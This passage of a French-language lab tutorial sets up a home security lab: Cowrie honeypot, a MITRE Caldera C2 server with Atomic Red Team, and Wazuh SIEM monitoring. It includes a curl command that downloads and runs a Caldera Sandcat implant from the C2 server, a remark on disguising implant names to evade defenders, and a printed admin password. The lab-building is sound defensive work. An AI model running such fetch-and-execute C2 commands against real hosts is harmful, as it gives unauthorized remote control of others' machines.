+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ansible-playbook -i ../inventory/inventory.ini deploy-cowrie.yml
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_10_hu282e9f742236c2783ab3d5c54f4048d0_138214_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_10_hu282e9f742236c2783ab3d5c54f4048d0_138214_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_10_hu282e9f742236c2783ab3d5c54f4048d0_138214_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_10_hu282e9f742236c2783ab3d5c54f4048d0_138214_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_10_hu282e9f742236c2783ab3d5c54f4048d0_138214_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Comme on peut le voir toutes les tâches ont été effectuées avec succès.</p>
+
+
+<h2 class="relative group">4. VM Caldera – Déploiement du Serveur C2 
+    <div id="4-vm-caldera--d%C3%A9ploiement-du-serveur-c2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#4-vm-caldera--d%C3%A9ploiement-du-serveur-c2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">4.1. Installation de Caldera 
+    <div id="41-installation-de-caldera" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#41-installation-de-caldera" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><strong>Clonage du dépôt et préparation de l&rsquo;environnement</strong><br>
+La récupération du code source et la préparation de l&rsquo;environnement Python se font par les commandes suivantes :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/mitre/caldera.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> caldera
+</span></span><span class="line"><span class="cl">python3 -m venv env
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> env/bin/activate
+</span></span><span class="line"><span class="cl">pip install --upgrade pip
+</span></span><span class="line"><span class="cl">pip install -r requirements.txt
+</span></span></code></pre></div>
+
+<h3 class="relative group">4.2. Compilation du Front-end et Accès à l&rsquo;interface web 
+    <div id="42-compilation-du-front-end-et-acc%C3%A8s-%C3%A0-linterface-web" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#42-compilation-du-front-end-et-acc%C3%A8s-%C3%A0-linterface-web" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>La construction des composants VueJS se déclenche avec le lancement du serveur en ajoutant l&rsquo;option <code>--build</code> (la présence de Node.js et npm est requise) :</p>
+<pre tabindex="0"><code>python3 server.py --insecure --build
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/11_caldera_built_sucefully_hu3a80876e5471309423d63f4ab3148f3f_536269_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/11_caldera_built_sucefully_hu3a80876e5471309423d63f4ab3148f3f_536269_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/11_caldera_built_sucefully_hu3a80876e5471309423d63f4ab3148f3f_536269_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/11_caldera_built_sucefully_hu3a80876e5471309423d63f4ab3148f3f_536269_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/11_caldera_built_sucefully_hu3a80876e5471309423d63f4ab3148f3f_536269_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ul>
+<li><strong>Accès à l&rsquo;interface</strong><br>
+L&rsquo;interface web est accessible via l&rsquo;URL <a href="http://localhost:8888" target="_blank">http://localhost:8888</a> ou via l&rsquo;adresse IP de la VM Caldera.<br>
+Les identifiants par défaut, tels qu&rsquo;indiqués dans le fichier de configuration (<code>red</code> pour le nom d&rsquo;utilisateur et <code>admin</code> pour le mot de passe), permettent l&rsquo;accès à l&rsquo;interface.</li>
+</ul>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/12_Caldera_Agent_deploy__hu514554f5990b095be8612518c4f90f81_724790_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/12_Caldera_Agent_deploy__hu514554f5990b095be8612518c4f90f81_724790_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/12_Caldera_Agent_deploy__hu514554f5990b095be8612518c4f90f81_724790_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/12_Caldera_Agent_deploy__hu514554f5990b095be8612518c4f90f81_724790_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/12_Caldera_Agent_deploy__hu514554f5990b095be8612518c4f90f81_724790_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/12_Caldera_Dashboard_huf4efb2fcf4404f27ace9fe88d7c5ff7a_142111_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/12_Caldera_Dashboard_huf4efb2fcf4404f27ace9fe88d7c5ff7a_142111_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/12_Caldera_Dashboard_huf4efb2fcf4404f27ace9fe88d7c5ff7a_142111_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/12_Caldera_Dashboard_huf4efb2fcf4404f27ace9fe88d7c5ff7a_142111_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/12_Caldera_Dashboard_huf4efb2fcf4404f27ace9fe88d7c5ff7a_142111_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>On peux modifier les identifiants par défauts et configurations contenues dans le fichier ``/Caldera/conf/dafault.yml</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/12_yml-conf_hub7903f8e24c8e9b289369cd9a21cea19_105274_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/12_yml-conf_hub7903f8e24c8e9b289369cd9a21cea19_105274_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/12_yml-conf_hub7903f8e24c8e9b289369cd9a21cea19_105274_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/12_yml-conf_hub7903f8e24c8e9b289369cd9a21cea19_105274_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/12_yml-conf_hub7903f8e24c8e9b289369cd9a21cea19_105274_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">4.3. Intégration de plugins 
+    <div id="43-int%C3%A9gration-de-plugins" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#43-int%C3%A9gration-de-plugins" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Les messages du serveur indiquent l&rsquo;activation de plugins tels que Sandcat, Atomic, Manx, etc. Pour le plugin Atomic Red Team, une erreur est survenu empêchant le clonage. Un clonage manuel sera donc effectué.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p plugins/atomic/data
+</span></span><span class="line"><span class="cl">git clone https://github.com/redcanaryco/atomic-red-team.git plugins/atomic/data/atomic-red-team
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/12_Caldera_Atomic_RT_hu824aec591db66107a38298d652478471_95165_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/12_Caldera_Atomic_RT_hu824aec591db66107a38298d652478471_95165_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/12_Caldera_Atomic_RT_hu824aec591db66107a38298d652478471_95165_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/12_Caldera_Atomic_RT_hu824aec591db66107a38298d652478471_95165_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/12_Caldera_Atomic_RT_hu824aec591db66107a38298d652478471_95165_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>Atomic Red Team est une bibliothèque open source de tests de sécurité mappés au framework MITRE ATT&amp;CK, permettant aux équipes de sécurité de simuler des techniques d&rsquo;attaque pour évaluer et améliorer leurs défenses.</p>
+</blockquote>
+
+
+<h3 class="relative group">4.4. Déploiement de l&rsquo;agent Caldera sur la VM Cowrie 
+    <div id="44-d%C3%A9ploiement-de-lagent-caldera-sur-la-vm-cowrie" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#44-d%C3%A9ploiement-de-lagent-caldera-sur-la-vm-cowrie" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Dans la section <strong>CAMPAIGNS&gt;agents</strong> cliquer sur <strong>Deploy an agent</strong> puis renseigner les informations nécessaires comme suit:</p>
+<blockquote>
+<p>Dans un exercice Red Team la variable <code>agents.implant_name</code> aurait eu un nom peu évident pour éviter les soupçons ou détection rapide par la Blue Team. Dans notre cas on l&rsquo;appelera juste Caldera pour un suivi simple</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/13_ad2deploy_agent_hucca5afd81621683d071c0b773b5bd3ab_206747_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/13_ad2deploy_agent_hucca5afd81621683d071c0b773b5bd3ab_206747_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/13_ad2deploy_agent_hucca5afd81621683d071c0b773b5bd3ab_206747_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/13_ad2deploy_agent_hucca5afd81621683d071c0b773b5bd3ab_206747_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/13_ad2deploy_agent_hucca5afd81621683d071c0b773b5bd3ab_206747_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ol>
+<li>Génération et exécution de la commande de déploiement de l&rsquo;agent:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  <span class="nv">server</span><span class="o">=</span><span class="s2">&#34;http://192.168.243.131:8888&#34;</span><span class="p">;</span>curl -s -X POST -H <span class="s2">&#34;file:sandcat.go&#34;</span> -H <span class="s2">&#34;platform:linux&#34;</span> <span class="nv">$server</span>/file/download &gt; caldera<span class="p">;</span>chmod +x caldera<span class="p">;</span>./caldera -server <span class="nv">$server</span> -group red -v
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/14_cAgent_on_cowrie_hu3977feccf1291765c465b99dbab69282_71072_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/14_cAgent_on_cowrie_hu3977feccf1291765c465b99dbab69282_71072_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/14_cAgent_on_cowrie_hu3977feccf1291765c465b99dbab69282_71072_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/14_cAgent_on_cowrie_hu3977feccf1291765c465b99dbab69282_71072_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/14_cAgent_on_cowrie_hu3977feccf1291765c465b99dbab69282_71072_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ul>
+<li>Le processus de déploiement est ainsi achevé et l&rsquo;agent Caldera a pu établir une connexion comme l&rsquo;indique l&rsquo;apparition de notre cible dans la section agents du dashboard avec le statut <code>Alive,trusted</code>:</li>
+</ul>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/15_agent_alive_huc0979769beb31765de75ed540f9e823d_82334_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/15_agent_alive_huc0979769beb31765de75ed540f9e823d_82334_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/15_agent_alive_huc0979769beb31765de75ed540f9e823d_82334_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/15_agent_alive_huc0979769beb31765de75ed540f9e823d_82334_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/15_agent_alive_huc0979769beb31765de75ed540f9e823d_82334_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ol>
+<li>Simulation d&rsquo;attaques et exécution de commandes distantes:</li>
+</ol>
+<p>Pour cette étape nous allons dans la section <strong>CAMPAIGNS &gt; operations</strong> puis sélectionner l&rsquo;option <strong>New Operation</strong>.</p>
+<p>Ici plusieurs options s&rsquo;offrent à nous de l&rsquo;exécution de commandes manuelles à la création et/ou l&rsquo;utilisation de profils d&rsquo;adversaires pré-enregistrés, offrant une éxécution automatisé d&rsquo;ensembles de commandes pour conduire diverses opérations allant de la reconnaissance, aux mouvements latérals, en passant par de l&rsquo;evasion d&rsquo;AV et pleins d&rsquo;autres choses.</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/13_adversary_simulation_1_hu8990ae56f985c1c90e77eefa92ae1033_92441_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/13_adversary_simulation_1_hu8990ae56f985c1c90e77eefa92ae1033_92441_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/13_adversary_simulation_1_hu8990ae56f985c1c90e77eefa92ae1033_92441_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/13_adversary_simulation_1_hu8990ae56f985c1c90e77eefa92ae1033_92441_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/13_adversary_simulation_1_hu8990ae56f985c1c90e77eefa92ae1033_92441_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Dans notre cas on utilisera le profil Discovery pour rapidement avoir un apperçu:</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/13_adversary_simulation_hu207537b991914d573316eefe67c8eba7_604588_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/13_adversary_simulation_hu207537b991914d573316eefe67c8eba7_604588_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/13_adversary_simulation_hu207537b991914d573316eefe67c8eba7_604588_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/13_adversary_simulation_hu207537b991914d573316eefe67c8eba7_604588_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/13_adversary_simulation_hu207537b991914d573316eefe67c8eba7_604588_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Comme on peut le voir sur la sortie tout fonctionne correctement, et il ne nous reste qu&rsquo;à configurer le monitoring et l&rsquo;agrégation des logs avec notre SIEM.</p>
+
+
+<h2 class="relative group">5. VM Wazuh – Déploiement du SIEM 
+    <div id="5-vm-wazuh--d%C3%A9ploiement-du-siem" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#5-vm-wazuh--d%C3%A9ploiement-du-siem" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">5.1. Installation 
+    <div id="51-installation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#51-installation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><strong>Utilisation du script d&rsquo;installation</strong><br>
+La méthode recommandée pour installer l&rsquo;ensemble des composants (Wazuh Server, Indexer et Dashboard) consiste à utiliser le script officiel en mode « all-in-one ».<br>
+La commande suivante (exécutée sur notre VM Wazuh, IP 192.168.243.132) télécharge et lance le script :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -sO https://packages.Wazuh.com/4.11/Wazuh-install.sh <span class="o">&amp;&amp;</span> sudo bash ./Wazuh-install.sh -a -o
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/14_Wazuh_all_in_one_hufce77a23b13f4e308169573fb8d89236_727439_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/14_Wazuh_all_in_one_hufce77a23b13f4e308169573fb8d89236_727439_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/14_Wazuh_all_in_one_hufce77a23b13f4e308169573fb8d89236_727439_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/14_Wazuh_all_in_one_hufce77a23b13f4e308169573fb8d89236_727439_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/14_Wazuh_all_in_one_hufce77a23b13f4e308169573fb8d89236_727439_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ul>
+<li>Accès au dashboard avec nos identifiants:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">INFO: You can access the web interface 
+</span></span><span class="line"><span class="cl">https://&lt;Wazuh-dashboard-ip&gt;:443
+</span></span><span class="line"><span class="cl">User: admin
+</span></span><span class="line"><span class="cl">Password: LlFP5?DlyG*n5q+H76xZgQj*dJeb7scl
+</span></span><span class="line"><span class="cl">INFO: Installation finished.
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/15_wazuh_dashboard_hu90331f9079b9eaaf0286a9f5cbce7965_74787_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/15_wazuh_dashboard_hu90331f9079b9eaaf0286a9f5cbce7965_74787_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/15_wazuh_dashboard_hu90331f9079b9eaaf0286a9f5cbce7965_74787_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/15_wazuh_dashboard_hu90331f9079b9eaaf0286a9f5cbce7965_74787_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/15_wazuh_dashboard_hu90331f9079b9eaaf0286a9f5cbce7965_74787_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/16_wazuh_dashboard_hu8cc71df17f6cd55c8b352dec16b7fb00_248483_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/16_wazuh_dashboard_hu8cc71df17f6cd55c8b352dec16b7fb00_248483_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/16_wazuh_dashboard_hu8cc71df17f6cd55c8b352dec16b7fb00_248483_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/16_wazuh_dashboard_hu8cc71df17f6cd55c8b352dec16b7fb00_248483_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/16_wazuh_dashboard_hu8cc71df17f6cd55c8b352dec16b7fb00_248483_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>Pour des raison de sécurité ou de covenience on pourrait changer les identifiants généré par défaut, ce qui est fortement conseillé en prod mais pour notre projet on le maintiendra tel quel.</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/16_admin_reset_hu6b280e4497a0a3fbbf45bebe5ee63dae_225206_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/16_admin_reset_hu6b280e4497a0a3fbbf45bebe5ee63dae_225206_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/16_admin_reset_hu6b280e4497a0a3fbbf45bebe5ee63dae_225206_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/16_admin_reset_hu6b280e4497a0a3fbbf45bebe5ee63dae_225206_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/16_admin_reset_hu6b280e4497a0a3fbbf45bebe5ee63dae_225206_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">5.2 Installation de l&rsquo;Agent Wazuh sur la VM Cowrie 
+    <div id="52-installation-de-lagent-wazuh-sur-la-vm-cowrie" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#52-installation-de-lagent-wazuh-sur-la-vm-cowrie" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Dans la section <strong>Agents management &gt; Summary</strong>,  après avoir cliqué sur <strong>Deploy new agent</strong> on renseigne les informations relatifs à notre machine et l&rsquo;adresse du serveur (VM Cowrie <code>192.168.243.130</code>)</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/17_agent_config_huffa912b4bfd4155e43f2d0fe2f262aae_149370_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/17_agent_config_huffa912b4bfd4155e43f2d0fe2f262aae_149370_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/17_agent_config_huffa912b4bfd4155e43f2d0fe2f262aae_149370_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/17_agent_config_huffa912b4bfd4155e43f2d0fe2f262aae_149370_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/17_agent_config_huffa912b4bfd4155e43f2d0fe2f262aae_149370_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ul>
+<li>Sur notre <strong>VM Cowrie</strong> on colle, puis exécute la commande et on obtient un résultat similaire à celui ci-dessous:</li>
+</ul>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/17_wazuh_on_cowrie_hu52e5799eeec8f037b614dbfd827d80b9_311303_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/17_wazuh_on_cowrie_hu52e5799eeec8f037b614dbfd827d80b9_311303_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/17_wazuh_on_cowrie_hu52e5799eeec8f037b614dbfd827d80b9_311303_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/17_wazuh_on_cowrie_hu52e5799eeec8f037b614dbfd827d80b9_311303_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/17_wazuh_on_cowrie_hu52e5799eeec8f037b614dbfd827d80b9_311303_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ul>
+<li>Activation et démarrage du service <strong>Wazuh-agent</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systemctl daemon-reload
+</span></span><span class="line"><span class="cl">systemctl <span class="nb">enable</span> Wazuh-agent
+</span></span><span class="line"><span class="cl">systemctl start Wazuh-agent
+</span></span></code></pre></div><ul>
+<li>Le processus de déploiement est maintenant terminé et l&rsquo;agent Wazuh fonctionne avec succès sur votre système Linux et comme le montre la capture de la section endpoints-summary.</li>
+</ul>
+<blockquote>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/18_agent_installed_cowrie_hudc27db4a2d35dc1725afb9cf7de42374_73678_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/18_agent_installed_cowrie_hudc27db4a2d35dc1725afb9cf7de42374_73678_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/18_agent_installed_cowrie_hudc27db4a2d35dc1725afb9cf7de42374_73678_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/18_agent_installed_cowrie_hudc27db4a2d35dc1725afb9cf7de42374_73678_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/18_agent_installed_cowrie_hudc27db4a2d35dc1725afb9cf7de42374_73678_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>La documentation officielle recommande de désactiver les mises à jour de Wazuh étant donné que la compatibilité entre l&rsquo;agent Wazuh et le gestionnaire de Wazuh n&rsquo;est garantie que lorsque la version Wazuh Manager est supérieur ou égale à celle de l&rsquo;agent Wazuh et donc d&rsquo;éviter les mises à niveau accidentelles en utilisant la commande:</p>
+<pre tabindex="0"><code></code></pre></blockquote>
+<p>sed -i &ldquo;s/^deb/#deb/&rdquo; /etc/apt/sources.list.d/Wazuh.list &amp;&amp; apt-get update</p>
+<blockquote>
+<pre tabindex="0"><code>**NB:** Pour de futurs mises à jour il nous suffira de dé-commenter cette ligne dans le fichier /etc/apt/sources.list.
+</code></pre></blockquote>
+
+
+<h3 class="relative group">5.3 Configuration du monitoring des logs Cowrie 
+    <div id="53-configuration-du-monitoring-des-logs-cowrie" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#53-configuration-du-monitoring-des-logs-cowrie" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/37_Wazuh_Cowrie_Group_hub4e0579323132890a5c4343e110b3a93_45458_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/37_Wazuh_Cowrie_Group_hub4e0579323132890a5c4343e110b3a93_45458_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/37_Wazuh_Cowrie_Group_hub4e0579323132890a5c4343e110b3a93_45458_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/37_Wazuh_Cowrie_Group_hub4e0579323132890a5c4343e110b3a93_45458_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/37_Wazuh_Cowrie_Group_hub4e0579323132890a5c4343e110b3a93_45458_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Un <strong>Groupe</strong> nommé <strong>cowrie</strong> a été créé et assigné à l&rsquo;agent via le dashboard, en y intégrant la configuration suivante dans le fichier <strong><em>agent.conf</em></strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;agent_config&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;localfile&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;log_format&gt;</span>json<span class="nt">&lt;/log_format&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;location&gt;</span>/home/cowrie/cowrie/var/log/cowrie/cowrie.json<span class="nt">&lt;/location&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/localfile&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/agent_config&gt;</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/38_Agent-Conf_hu1f7416e34c6890b99519cd2e087c26f9_49321_330x0_resize_box_3.png 330w,
